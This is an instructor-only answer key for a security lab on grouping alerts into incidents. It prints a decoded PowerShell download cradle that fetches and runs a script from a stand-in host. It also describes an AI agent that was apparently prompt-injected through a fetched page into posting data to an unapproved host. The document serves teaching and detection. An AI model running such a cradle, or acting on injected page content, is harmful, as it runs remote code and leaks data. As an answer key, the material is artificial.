# Lab 4 worked solution (instructor only)

## Part 4: `lab4-alert-bundle.json`

Intended grouping:

- **Incident 1, account takeover (true positive, high):** L2 (impossible travel with an approved MFA prompt at 08:08, a push-fatigue or token-theft pattern), L1 (forwarding rule created from the same IP 203.0.113.55, a business email compromise persistence step), L5 (encoded PowerShell started by OUTLOOK.EXE on Dana's laptop at 08:20). Decoding the L5 base64 (UTF-16LE) gives `IEX (New-Object Net.WebClient).DownloadString("http://files.cdn-sync.test/a.ps1")`, a download cradle. ATT&CK: T1078.004 (Valid Accounts: Cloud Accounts), T1114.003 (Email Forwarding Rule), T1059.001 (PowerShell). Note that L5 may be a second stage on the laptop, not only a mailbox compromise; the order of events (08:09, 08:12, 08:20) shows one actor on both.
- **Incident 2, AI agent exfiltration (true positive, high):** L6. A write-type tool (`http_post`) to `hooks.pastebox.test`, which is not on the approved list, 2.1 MB, twenty seconds after the agent fetched a web page: the Demo 13 and Demo 17 pattern (prompt injection through fetched content). ATLAS: prompt injection and exfiltration through an agent tool; ATT&CK T1567 (Exfiltration Over Web Service).
- **False positives:** L3 (the scheduled Monday 07:00 vulnerability scan, 07:03 is inside the window), L4 (nightly backup, 02:00 on the schedule, the transfer size matches), L7 (an antivirus update domain on the approved vendors list; first seen this month is not evidence of harm).

Common AI mistakes to expect (any of these is acceptable for the write-up if the student shows the evidence line):

- Calling L3 or L4 malicious because of the volume, ignoring the asset notes.
- Treating L7 as C2 because the domain is "rare".
- Missing that L1, L2 and L5 are one incident, or merging L6 into it.
- Wrong ATT&CK IDs or sub-technique numbers (for example DNS instead of Web Protocols); invented details such as a named malware family or a file hash that the bundle does not contain.
- A confident percentage with no method.
- Reversing a direction (inbound versus outbound) or the units (MB versus GB; L4 is 41 GB).

Grading note: the claims table is the main skill; do not give full marks for a table that quotes the AI without a checked evidence line for each claim.
